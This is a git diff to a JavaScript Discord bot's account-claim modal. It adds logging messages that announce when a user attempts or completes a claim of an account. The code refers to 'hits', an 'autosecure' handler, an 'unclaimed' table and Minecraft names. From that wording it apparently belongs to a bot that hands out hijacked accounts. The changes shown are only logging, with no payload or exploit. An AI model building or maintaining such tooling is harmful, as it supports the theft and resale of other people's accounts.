@@ -1,4 +1,4 @@
-const { ApplicationCommandOptionType, TextInputStyle } = require("discord.js");
+const { ApplicationCommandOptionType, TextInputStyle, EmbedBuilder } = require("discord.js");
 const { queryParams } = require("../../../db/database");
 const { 
     handleAutosecureHit,
@@ -68,6 +68,21 @@ module.exports = {
             }
 
             if (!hitData || hitData.length === 0) {
+                // Send alert to logs channel about attempted claim of already claimed account
+                try {
+                    const guild = await client.guilds.fetch(guildId);
+                    const channel = await guild.channels.fetch(channelId);
+                    
+                    if (channel) {
+                        const usernameToShow = enteredUsername || storedName || "Unknown";
+                        await channel.send({
+                            content: `Someone has tried to claim an account\n<@${interaction.user.id}> has tried to claim \`${usernameToShow}\``
+                        });
+                    }
+                } catch (logsError) {
+                    console.log('[ClaimModal] Failed to send alert to logs channel:', logsError.message);
+                }
+                
                 return safeReply({ content: `Couldn't find your hit!`, ephemeral: true });
             }
 
@@ -119,6 +134,20 @@ module.exports = {
             if (hit.embeds) {
                 await handleAutosecureHit(client, interaction, hit, guildId, channelId, storedName, isBotOwner);
                 await client.queryParams("DELETE FROM unclaimed WHERE user_id = ? AND username = ?", [client.username, storedName]);
+                
+                // Send success message to logs channel
+                try {
+                    const guild = await client.guilds.fetch(guildId);
+                    const channel = await guild.channels.fetch(channelId);
+                    
+                    if (channel) {
+                        await channel.send({
+                            content: `Someone has claimed an account\n<@${interaction.user.id}> has claimed \`${storedName}\`\nHeres a link to the secure: <#${channelId}>`
+                        });
+                    }
+                } catch (logsError) {
+                    console.log('[ClaimModal] Failed to send claim success message:', logsError.message);
+                }
             } else {
                 const { acc, uid, mcname } = hit;
                 
@@ -133,6 +162,20 @@ module.exports = {
                 }
                 await client.queryParams("DELETE FROM unclaimed WHERE user_id = ? AND username = ?", [client.username, mcname]);
                 await client.queryParams("DELETE FROM unclaimed WHERE user_id = ? AND username = ?", [client.username, acc.oldName]);
+                
+                // Send success message to logs channel
+                try {
+                    const guild = await client.guilds.fetch(guildId);
+                    const channel = await guild.channels.fetch(channelId);
+                    
+                    if (channel) {
+                        await channel.send({
+                            content: `Someone has claimed an account\n<@${interaction.user.id}> has claimed \`${mcname}\`\nHeres a link to the secure: <#${channelId}>`
+                        });
+                    }
+                } catch (logsError) {
+                    console.log('[ClaimModal] Failed to send claim success message:', logsError.message);
+                }
             }
             
            
